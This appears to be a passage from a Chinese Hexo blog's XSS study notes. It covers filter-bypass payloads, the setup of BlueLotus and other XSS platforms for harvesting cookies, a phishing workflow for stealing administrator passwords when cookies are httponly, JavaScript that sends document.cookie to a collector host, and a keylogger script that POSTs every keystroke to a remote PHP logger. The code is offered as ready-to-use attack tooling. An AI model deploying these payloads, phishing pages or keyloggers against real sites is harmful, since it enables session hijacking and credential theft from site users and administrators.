<li>Refused to execute a javascript script.Source code of script found within request</li>
<li>查看源码 -&gt; 是否被和谐</li>
</ul>
</li>
<li>绕过通用方法<ul>
<li>要求<ul>
<li>缺陷点允许&lt;&gt; </li>
<li>缺陷点运行=</li>
<li>缺陷点的后方存在<code>&lt;/script&gt;</code>标签</li>
</ul>
</li>
<li>构造payload：<code>&lt;script src=data:,alert(1)&lt;!--</code></li>
</ul>
</li>
</ul>
<h4 id="18-XSS过滤器绕过-猥琐绕过"><a href="#18-XSS过滤器绕过-猥琐绕过" class="headerlink" title="18. XSS过滤器绕过 [猥琐绕过]"></a>18. XSS过滤器绕过 [猥琐绕过]</h4><ul>
<li>这里是以 “=” 分割，因而我们的代码中是不允许携带等号的。故上一篇的技巧不能拿到这里来使用</li>
<li>…”观察地形” -&gt; 怎么形成参数 -&gt; js代码分析</li>
<li>▲ chrome拦截，是有一定的拦截规则的，只有它觉得是恶意代码的才会去拦截</li>
</ul>
<h4 id="19-存储型XSS入门-什么都没过滤的情况"><a href="#19-存储型XSS入门-什么都没过滤的情况" class="headerlink" title="19. 存储型XSS入门 [什么都没过滤的情况]"></a>19. 存储型XSS入门 [什么都没过滤的情况]</h4><ul>
<li>反射型是：输入–输出 / 存储型是：输入–进入数据库*–取出数据库–输出。</li>
<li>差别<ul>
<li>反射型是：绝大部分情况下，输入在哪里，输出就在哪里</li>
<li>存储型是：输入在A处进入数据库， 而输出则可能出现在其它任何用到数据的地方。</li>
<li>反射型是：输入大部分位于地址栏或来自DOM的某些属性，也会偶尔有数据在请求中（POST类型）</li>
<li>存储型是：输入大部分来自POST/GET请求，常见于一些保存操作中</li>
</ul>
</li>
<li>⭐ 寻找存储型：输出的位置不一定出现在输入的位置<ul>
<li>先找到输出点，然后猜测此处输出是否会被过滤</li>
<li>如果觉得可能没过滤，我们再找到这个输出是在哪里输入的</li>
<li>接着开始测试输入，看输出的效果</li>
<li>如果没过滤，那么你就成功了，否则你可以放弃掉它</li>
</ul>
</li>
</ul>
<h4 id="20-存储型XSS入门-套现绕过富文本"><a href="#20-存储型XSS入门-套现绕过富文本" class="headerlink" title="20. 存储型XSS入门 [套现绕过富文本]"></a>20. 存储型XSS入门 [套现绕过富文本]</h4><ul>
<li>富文本操作<ul>
<li>白名单，即：只允许使用白名单内的合法HTML标签，例如IMG，其它均剔除</li>
<li>黑名单，即：厂商会构建一个有危害的HTML标签、属性列表，然后通过分析用户提交的HTML代码，剔除其中有害的部分</li>
<li>▲ 白名单要安全得多，而黑名单的方式则经常会被绕过</li>
<li>▲ 当所有的思路走不通时，可以用富文本，大量的payload去碰撞，用bp进行抓包修改</li>
</ul>
</li>
</ul>
<h4 id="21-存储型XSS进阶-猜测规则，利用Flash-addCallback构造XSS"><a href="#21-存储型XSS进阶-猜测规则，利用Flash-addCallback构造XSS" class="headerlink" title="21. 存储型XSS进阶 [猜测规则，利用Flash addCallback构造XSS]"></a>21. 存储型XSS进阶 [猜测规则，利用Flash addCallback构造XSS]</h4>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/02/XSS--XSS%E5%B9%B3%E5%8F%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/02/XSS--XSS%E5%B9%B3%E5%8F%B0/" itemprop="url">XSS--XSS平台</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T16:01:27+08:00">
                2020-04-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/XSS/" itemprop="url" rel="index">
                    <span itemprop="name">XSS</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.1k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  4 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-外用XSS平台"><a href="#1-外用XSS平台" class="headerlink" title="1. 外用XSS平台"></a>1. 外用XSS平台</h4><ul>
<li>XSS平台注册</li>
<li>cookie<ul>
<li>创建模块</li>
<li>项目名称</li>
<li>默认模块 -&gt; keepsession</li>
<li>生成项目代码</li>
</ul>
</li>
<li>工具：COOKIE强力注入工具（小马）-&gt; 漏洞页面+COOKIE输入 -&gt; 强制修改 -&gt; 浏览尝试</li>
<li>工具：Firefox浏览器Cookies Manager -&gt; 搜索 -&gt; Add Cookie（添加一个或多个）</li>
<li>XSS平台<ul>
<li>webhack platfrom：<a href="http://www.webhack.cn/" target="_blank" rel="noopener">http://www.webhack.cn/</a></li>
<li>xsshs：<a href="https://xsshs.cn/" target="_blank" rel="noopener">https://xsshs.cn/</a></li>
</ul>
</li>
</ul>
<h4 id="2-个人XSS平台（BlueLotus）"><a href="#2-个人XSS平台（BlueLotus）" class="headerlink" title="2. 个人XSS平台（BlueLotus）"></a>2. 个人XSS平台（BlueLotus）</h4><ul>
<li>原项目地址：<a href="https://github.com/firesunCN/_XSSReceiver" target="_blank" rel="noopener">https://github.com/firesunCN/_XSSReceiver</a></li>
<li>项目地址：<a href="https://github.com/asw3asw/BlueLotus_XSSReceiver" target="_blank" rel="noopener">https://github.com/asw3asw/BlueLotus_XSSReceiver</a></li>
<li>安装博客链接：<a href="https://www.cnblogs.com/blacksunny/p/8401688.html" target="_blank" rel="noopener">https://www.cnblogs.com/blacksunny/p/8401688.html</a></li>
<li>实验环境<ul>
<li>服务器：CentOS</li>
<li>Web容器：Apache</li>
<li>脚本语言：PHP</li>
</ul>
</li>
<li>安装Apache<ul>
<li>yum install httpd –y</li>
<li>service httpd start</li>
<li>浏览器访问<a href="http://IP地址尝试，能否访问到页面" target="_blank" rel="noopener">http://IP地址尝试，能否访问到页面</a></li>
</ul>
</li>
<li>安装PHP<ul>
<li>yum install php –y</li>
</ul>
</li>
<li>安装Git<ul>
<li>yum install git –y</li>
</ul>
</li>
<li>源码存放<ul>
<li>从Github上下载源码</li>
<li>mkdir /var/www/html/xss</li>
<li>存放源码到/xss目录中</li>
<li>chomd -R 777 /var/www/html/xss（此平台一些文件夹需可读可写可执行权限）</li>
</ul>
</li>
<li>配置虚拟主机<ul>
<li>新建虚拟主机配置文件夹：mkdir/etc/httpd/conf/vhost</li>
<li>新建虚拟主机配置文件：vi /etc/httpd/conf/vhost/httpd-vhosts.conf</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:8088&gt;</span><br><span class="line">    DocumentRoot &quot;/var/www/html/xss&quot;</span><br><span class="line">    DirectoryIndex admin.php</span><br><span class="line">    ServerName xss.xxx.top</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line">&lt;VirtualHost *:8088&gt;</span><br><span class="line">    DocumentRoot &quot;/var/www/html/web&quot;</span><br><span class="line">    DirectoryIndex index.php</span><br><span class="line">    ServerName web.xxx.top</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line">&lt;VirtualHost *:8088&gt;</span><br><span class="line">    DocumentRoot &quot;/var/www/html/kodex&quot;</span><br><span class="line">    DirectoryIndex index.php</span><br><span class="line">    ServerName kodex.xxx.top</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>配置Apache<ul>
<li>备份配置文件：cp/etc/httpd/conf/httpd.conf /etc/httpd/conf/httpd.conf.bak</li>
<li>编辑配置文件：vi/etc/httpd/conf/httpd.conf<ul>
<li>DocumentRoot “/var/www/html”</li>
<li>Options ExecCGIFollowSymLinks（允许服务器使用CGI，在Directory的/var/www/html目录下）</li>
<li>AllowOverrideAll（在Directory的/var/www/html目录下）</li>
<li>插入：Include/etc/httpd/conf/vhost/httpd-vhosts.conf</li>
</ul>
</li>
</ul>
</li>
<li>重启Apache：service httpd restart</li>
<li>安装平台<ul>
<li>访问http://服务器IP地址</li>
<li>设置后台登录密码、数据加密密码<ul>
<li>其余选项可保持默认，然后提交</li>
<li>▲ 一定记得要修改</li>
<li>▲ 若提示data/template/myjs三个存储路径需要写权限，可在/xss目录下进行修改</li>
</ul>
</li>
<li>安装成功</li>
</ul>
</li>
<li>登陆访问尝试以及平台测试（获取Cookie）<ul>
<li>访问http://服务器IP地址/login.php</li>
<li>配置公共模板default.js，修改js代码中的网站地址为http://服务器IP地址/index.php</li>
<li>最后，点击下方的修改，保存修改</li>
<li>进入”我的js”模块</li>
<li>设置js文件名称</li>
<li>选择default.js模板</li>
<li>插入模板</li>
<li>新增保存js测试代码</li>
<li>生成payload</li>
<li>站点尝试是否能打到cookie（即使http-only也会返回一定数据）</li>
</ul>
</li>
</ul>
<h4 id="3-多人用XSS平台"><a href="#3-多人用XSS平台" class="headerlink" title="3. 多人用XSS平台"></a>3. 多人用XSS平台</h4><ul>
<li>▲ 修改已有XSS平台的代码，然后搭建在自己的服务器上</li>
<li>Window Server 2003 -&gt;  iis搭建xss平台套装（ZkeysPHP、xs.zip、ISAPI_Rewrite3）<ul>
<li>Window Server 2003绑定静态IP<ul>
<li>需要一个固定IP，若要提供外网使用，需要一个外网IP</li>
</ul>
</li>
<li>安装iis -&gt; 开始 -&gt; 管理工具 -&gt; IIS -&gt; 网站 -&gt; 默认网站</li>
<li>默认网站 -&gt; 网站根目录 -&gt; 清除源码 -&gt; 拷贝xs.zip中的源码到文件夹</li>
<li>安装ZkeysPHP（php+mysql环境）</li>
<li>浏览器访问<a href="http://127.0.0.1:999（phpmyadmin）" target="_blank" rel="noopener">http://127.0.0.1:999（phpmyadmin）</a><ul>
<li>用户名：root / 密码：zkeys</li>
<li>创建数据库xss</li>
<li>导入 -&gt; 浏览 -&gt; 网站根目录 -&gt; xssplatform.sql -&gt; 执行</li>
<li>SQL -&gt; UPDATE oc_moudle SET code=REPLACE(code,’<a href="http://xsser.me&#39;,&#39;http://Window" target="_blank" rel="noopener">http://xsser.me&#39;,&#39;http://Window</a> Server 2003的IP’)</li>
</ul>
</li>
<li>网站根目录 -&gt; config.php -&gt; 查看配置是否修改（urlroot等）</li>
<li>物理机访问Window Server 2003的IP/index.php查看是否访问得到<ul>
<li>可添加index.php为网站默认页，通过默认网站 -&gt; 属性 -&gt; 文档 -&gt; 添加 -&gt; index.php -&gt; 应用</li>
<li>进行用户名，密码邮箱的注册，并登陆</li>
</ul>
</li>
<li>创建XSS项目</li>
<li>▲ 若无法盗取cookie，进行ISAPI_Rewrite3软件的安装<ul>
<li>默认安装 -&gt; 开始 -&gt; Helicon -&gt; ISAPI_Rewrite3 -&gt; 默认站点 -&gt; 编辑 -&gt; 应用</li>
</ul>
</li>
<li>▲ 邀请码模式<ul>
<li>浏览器访问<a href="http://127.0.0.1:999（phpmyadmin）" target="_blank" rel="noopener">http://127.0.0.1:999（phpmyadmin）</a><ul>
<li>用户名：root / 密码：zkeys</li>
<li>点击oc_user表，修改刚新添加的用户的adminLevel级别为1</li>
<li>执行</li>
</ul>
</li>
<li>修改权限（网站根目录）<ul>
<li>权限设置：shift所有的目录 -&gt; 右键 -&gt; 属性 -&gt; 安全 -&gt; 添加 -&gt; Everyone -&gt; 允许所有操作</li>
<li>权限设置：shift所有的文件 -&gt; 右键 -&gt; 属性 -&gt; 安全 -&gt; 添加 -&gt; Everyone -&gt; 允许所有操作</li>
<li>对网站根目录设置权限：右键 -&gt; 属性 -&gt; 安全 -&gt; 添加 -&gt; Everyone -&gt; 允许所有操作（▲ PHP需求）</li>
</ul>
</li>
<li>浏览器访问<a href="http://Window" target="_blank" rel="noopener">http://Window</a> Server 2003的IP/index.php?do=user&amp;act=invite</li>
<li>进行生成邀请码</li>
<li>邀请码注册尝试</li>
</ul>
</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/02/XSS--Cookie%E4%B8%8E%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/02/XSS--Cookie%E4%B8%8E%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8/" itemprop="url">XSS--Cookie与键盘记录器</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T16:01:27+08:00">
                2020-04-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/XSS/" itemprop="url" rel="index">
                    <span itemprop="name">XSS</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  926 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  3 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-Cookie的获取"><a href="#1-Cookie的获取" class="headerlink" title="1. Cookie的获取"></a>1. Cookie的获取</h4><ul>
<li>反射型XSS的cookie获取</li>
<li>存储型XSS的cookie获取</li>
<li>http-only启用时获取登陆密码（钓鱼方式）<ul>
<li>钓鱼准备<ul>
<li>伪造一个完全相同的登陆界面a.html（可通过右键保存页面为html）</li>
<li>编写一个a.php，用于接收a.html的传值并跳转到b.php</li>
<li>编写一个b.php，用于传值后跳转到正常的登陆界面</li>
</ul>
</li>
<li>攻击者往有xss漏洞的地方传入访问a.html的代码</li>
<li>管理员登陆后台，触发攻击者插入的html代码，弹窗显示a.html界面<ul>
<li>若想要逼真，可通过js代码展示”登陆超时，请重新登陆的”</li>
</ul>
</li>
<li>管理员输入账号密码进行登陆，然后通过b.php跳转到正常登陆页面</li>
<li>攻击者接收到管理员输入的账号密码</li>
<li>▲ Linux平台和Windows平台克隆下来的界面源代码可能出现编码问题</li>
<li>▲ 每次点击一次管理界面，都会触发一次xss代码</li>
</ul>
</li>
<li>httponly下的攻击手法（来自Se7en）<ul>
<li>phpinfo页<ul>
<li>伪造对方身份访问同站的phpinfo页面，因为同域所以通过ajax提交访问可以读取到responseText，其中<code>$_SERVER[&quot;HTTP_COOKIE&quot;]</code>会打印出具有httponly属性的cookies</li>
<li>优点：成功率很高，最不容易被察觉，也是最常用的一种方式</li>
<li>缺点：需要phpinfo页，条件苛刻</li>
</ul>
</li>
<li>框架钓鱼<ul>
<li>通过<iframe>标签嵌入一个远程域，完全撑开后，以覆盖原有的页面</li>
<li>优点：无跳转，域名无改变</li>
<li>缺点：通常会覆盖某个正常的页面，管理员易察觉</li>
</ul>
</li>
<li>跳转钓鱼<ul>
<li>通过购买相似域名，构建相同的钓鱼页面，使受害者跳转至钓鱼站</li>
<li>优点：主动性较强，可主动钓鱼</li>
<li>缺点：成本较高，且由于页面跳转过于明显，所以此方法十分容易被发现</li>
</ul>
</li>
<li>历史密码<ul>
<li>通过js伪造登录表单，欺骗浏览器自动填入，由此获取浏览器记住的历史密码</li>
<li>优点：不易被发现，可直接获取明文，成功率较高</li>
<li>缺点：各内核浏览器兼容性不一，最新版google已不支持http协议下的自动填入功能</li>
</ul>
</li>
<li>获取源码<ul>
<li>通过xss获取后端页面源码，常常可以发现一些越权访问，或者配合CSRF打组合拳去添加新用户或者执行其他的功能，以及通过审计后台js发现一些漏洞等</li>
<li>优点：信息获取的比较详细，也可以获取到后台账号名称</li>
<li>缺点：局限性较大，不易于利用</li>
</ul>
</li>
</ul>
</li>
<li>编写接收cookie代码：简单形式a.js+cookie.php</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//a.js</span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">    var cookie = document.cookie;</span><br><span class="line">    var url = &quot;http://127.0.0.1/cookie.php?x=&quot;;</span><br><span class="line">    windows.location.href=url_cookie;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">//cookie.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $cookie = $_GET[&apos;x&apos;];</span><br><span class="line">    $file = fopen(&quot;cookie.txt&quot;,&quot;w+&quot;);</span><br><span class="line">    fwrite($file,$cookie);</span><br><span class="line">    fclose($file);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>编写接收cookie代码：极简模式b.js-2+cookies.php<ul>
<li>b.js放于80端口，cookies.php是不存在的</li>
<li>▲ 需要监听b.js中设定的端口</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var img = new Image();</span><br><span class="line">img.src=&quot;http://1.1.1.1:非80/cookies.php?cookie==&quot;+document.cookie;</span><br></pre></td></tr></table></figure>

<h4 id="2-键盘记录器"><a href="#2-键盘记录器" class="headerlink" title="2. 键盘记录器"></a>2. 键盘记录器</h4><ul>
<li>三个文件位于同个目录</li>
<li>Keylogger.js</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">document.onkeypress = function(evt) &#123; </span><br><span class="line">    evt = evt || window.event </span><br><span class="line">    key = String.fromCharCode(evt.charCode) </span><br><span class="line">    if (key) &#123;       </span><br><span class="line">        var http = new XMLHttpRequest(); </span><br><span class="line">        var param = encodeURI(key) http.open(&quot;POST&quot;,&quot;http://192.168.20.8/keylogger.php&quot;,true); http.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">        http.send(&quot;key=&quot;+param); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>Keylogger.php</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    $key=$_POST[&apos;key&apos;]; </span><br><span class="line">    $logfile=&quot;keylog.txt&quot;; </span><br><span class="line">    $fp = fopen($logfile, &quot;a&quot;); </span><br><span class="line">    fwrite($fp, $key); </span><br><span class="line">    fclose($fp);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>keylog.txt，不需要有数据，但需要有可读可写的权限</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/19/">19</a><a class="extend next" rel="next" href="/page/2/">Next</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/photo.jpg"
                alt="Tomas" />
            
              <p class="site-author-name" itemprop="name">Tomas</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">181</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">10</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/Tomassky" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:tomassky7@gmail.com" target="_blank" title="Gmail邮箱">
                      
                        <i class="fa fa-fw fa-envelope"></i>Gmail邮箱</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ylsword-cheat.top" title="LengSword" target="_blank">LengSword</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://neigeshoufu.github.io/ljy.github.io" title="neigeshoufu" target="_blank">neigeshoufu</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Tomas</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">176.3k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
